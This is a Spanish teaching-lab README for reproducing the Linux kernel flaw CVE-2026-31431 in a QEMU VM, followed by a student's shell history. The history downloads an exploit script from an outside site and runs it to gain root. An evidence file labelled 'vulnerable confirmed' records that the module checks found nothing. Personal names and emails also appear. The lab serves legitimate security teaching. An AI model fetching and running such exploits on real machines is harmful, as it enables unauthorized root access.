# Copy Fail Lab — CVE-2026-31431 (v2)

Devcontainer reproducible para experimentar con la vulnerabilidad **Copy Fail**
(CVE-2026-31431) en un kernel Linux 6.12 controlado dentro de QEMU.

Esta v2 incorpora todas las correcciones aprendidas en una sesión de debugging
exhaustiva: opciones de kernel necesarias para que arranque, configuración
correcta de BusyBox estático, rutas dinámicas independientes del nombre del repo,
y dependencias Ubuntu 24.04 corregidas.

---

## Inicio rápido para el estudiante

1. Abre un Codespace desde este repo.
   ```bash
   #CONFIGURACION DE EJEMPLO!!!!!!!!!!!
   apt update
   apt install gh
   
   gh api user --jq '"\(.name) → \(.email // .login)"'
   
   git config --global user.name "Jonathan E. Tito O."
   git config --global user.email "jonathantito@users.noreply.github.com"
   git config --global --add safe.directory /workspaces/copy-fail-challenge-1
   make setup
   ```
3. Configura tu identidad git:
   ```bash
   git config --global user.name "Tu Nombre"
   git config --global user.email "tu@correo.com"
   ```
4. Ejecuta:
   ```bash
   make setup    # descarga kernel + arma rootfs (~5 min)
   make qemu     # arranca la VM vulnerable
   ```

Para salir de QEMU: `Ctrl+A` luego `X`.

---

## Configuración inicial del docente (una sola vez)

### 1. Subir este repo a GitHub

```bash
cd copyfail-v2
git init && git add -A && git commit -m "initial"
git branch -M main
gh repo create TU-ORG/copy-fail-lab --public --source=. --push
```

### 2. Marcarlo como Template

GitHub → tu repo → Settings → marcar `Template repository`.

### 3. Editar `.devcontainer/devcontainer.json`

Cambia el valor `KERNEL_REPO`:
```json
"KERNEL_REPO": "TU-ORG/copy-fail-lab"
```

Commit y push.

### 4. Disparar el workflow del kernel

GitHub → Actions → `Build Vulnerable Kernel` → Run workflow.
Tarda ~25 min en los servidores de GitHub (no en tu Codespace).
Al terminar crea un Release con el `bzImage_vuln` listo para descarga.

### 5. Verificar

Tu repo → Releases → debe aparecer `kernel-v6.12-vuln` con tres archivos
adjuntos. Los estudiantes ahora pueden hacer `make setup` y descarga en 2 min.

---

## Estructura del repo

```
.
├── .devcontainer/
│   ├── Dockerfile             ← Ubuntu 24.04 + deps verificadas
│   └── devcontainer.json      ← sin rutas hardcodeadas
├── .github/workflows/
│   └── build-kernel.yml       ← compila kernel y crea Release
├── scripts/
│   ├── 00_welcome.sh
│   ├── 01_fetch_kernel.sh     ← descarga del Release
│   ├── 02_build_kernel.sh     ← fallback: compila desde fuente
│   ├── 03_build_rootfs.sh     ← BusyBox estático + initramfs
│   └── 04_run_qemu.sh
├── Makefile
└── README.md
```

---

## Comandos disponibles

| Comando | Acción |
|---|---|
| `make setup` | Descarga kernel + arma rootfs (~5 min) |
| `make qemu` | Arranca la VM vulnerable |
| `make info` | Muestra el estado del ambiente |
| `make rootfs` | Reconstruye solo el initramfs |
| `make fetch-kernel` | Solo descarga el bzImage del Release |
| `make build-kernel` | Compila kernel desde fuente (~25 min) |
| `make clean` | Borra builds (mantiene fuentes) |
| `make clean-all` | Borra todo |

---

## Recursos del CVE

- Write-up técnico: https://xint.io/blog/copy-fail-linux-distributions
- Sitio del CVE: https://copy.fail
- PoC oficial: https://github.com/theori-io/copy-fail-CVE-2026-31431

---

## Lecciones aprendidas (referencia para futuras versiones)

Esta v2 incorpora los siguientes fixes respecto a la v1:

- `hexdump` → `bsdextrautils` en Ubuntu 24.04
- `bzip2` agregado al Dockerfile (lo necesita BusyBox)
- Eliminado el `mounts` con ruta hardcodeada en `devcontainer.json`
- Todos los scripts detectan workspace con `SCRIPT_DIR` dinámico
- Kernel: agregadas opciones críticas `BINFMT_ELF`, `BINFMT_SCRIPT`, `RD_GZIP`
- Kernel: agregada dep `CRYPTO_AEAD` antes de `CRYPTO_AUTHENCESN`
- BusyBox: reemplazado `scripts/config` (no existe) por `sed`
- BusyBox: eliminado `olddefconfig` (no existe en BusyBox)
- BusyBox: deshabilitado `CONFIG_TC` (rompe compilación con kernels nuevos)
- BusyBox: forzado `CONFIG_STATIC=y` y verificado con `file`
- Workflow Actions: greps de verificación con `|| echo`, tolerantes


#Results:
~ $ uname -r
# 6.12.0

~ $ lsmod | grep alg
# -sh: lsmod: not found

~ $ id
# uid=1001(student) gid=1001(student) groups=1001(student)

~ $ whoami
# student

~ $ cat /proc/modules | grep algif
# cat: can't open '/proc/modules': No such file or directory

History 
1  apt update
    2  apt install gh
    3  gh api user --jq '"\(.name) → \(.email // .login)"'
    4  git config --global user.name "sammy1208-g"
    5  git config --global user.email "samchamorroca@uide.edu.ec"
    6  git config --global --add safe.directory /workspaces/copy-fail-challenge-1
    7  make setup
    8  make qemu
    9  apt update
   10  apt install file -y
   11  make setup
   12  make qemu
   13  cp /tmp/hito1.txt evidence/hito1_vuln_confirmed.txt
   14  make qemu
   15  cp /root/hito1.txt evidence/hito1_vuln_confirmed.txt
   16  cat > evidence/hito1_vuln_confirmed.txt << 'EOF'
=== HITO 1: KERNEL VULNERABLE CONFIRMADO ===
Fecha: Mon May 11 13:19:54 UTC 2026
Hostname: copy-fail-sammy1208-g
Kernel: 6.12.0
Identidad: uid=1001(student) gid=1001(student) groups=1001(student)
Módulos AF_ALG:
(no encontrado con lsmod, verificar /proc/modules)
algif_aead en /proc/modules:
(no encontrado)
EOF

   17  mkdir -p evidence
   18  cat > evidence/hito1_vuln_confirmed.txt << 'EOF'
=== HITO 1: KERNEL VULNERABLE CONFIRMADO ===
Fecha: Mon May 11 13:19:54 UTC 2026
Hostname: copy-fail-sammy1208-g
Kernel: 6.12.0
Identidad: uid=1001(student) gid=1001(student) groups=1001(student)
Módulos AF_ALG:
(no encontrado con lsmod, verificar /proc/modules)
algif_aead en /proc/modules:
(no encontrado)
EOF

   19  cat evidence/hito1_vuln_confirmed.txt
   20  git add evidence/hito1_vuln_confirmed.txt
   21  git commit -m "hito-1: kernel vulnerable confirmado - $(date +%Y-%m-%dT%H:%M)"
   22  git tag -a hito-1 -m "Kernel vulnerable corriendo, algif_aead confirmado"
   23  git push origin main --tags
   24  git tag
   25  wget https://copy.fail/exp -O copy_fail_exp.py
   26  cat copy_fail_exp.py
   27  make qemu
   28  id
   29  python3 copy_fail_exp.py
   30  git add evidence/hito2_root_shell.txt
   31  git commit -m "hito-2: exploit exitoso, root obtenido - $(date +%Y-%m-%dT%H:%M)"
   32  git tag -a hito-2 -m "CVE-2026-31431 explotado exitosamente"
   33  git push origin main --tags
   34  git tag
   35  python3 copy_fail_exp.py
   36  python3 copy_fail_exp.py 2>&1
   37  {   echo "=== HITO 3: MITIGACIÓN TEMPORAL ===";   echo "Fecha: $(date)";   echo "Hostname: $(hostname)";   echo "algif_aead en lsmod:";   cat /proc/modules | grept
   38  history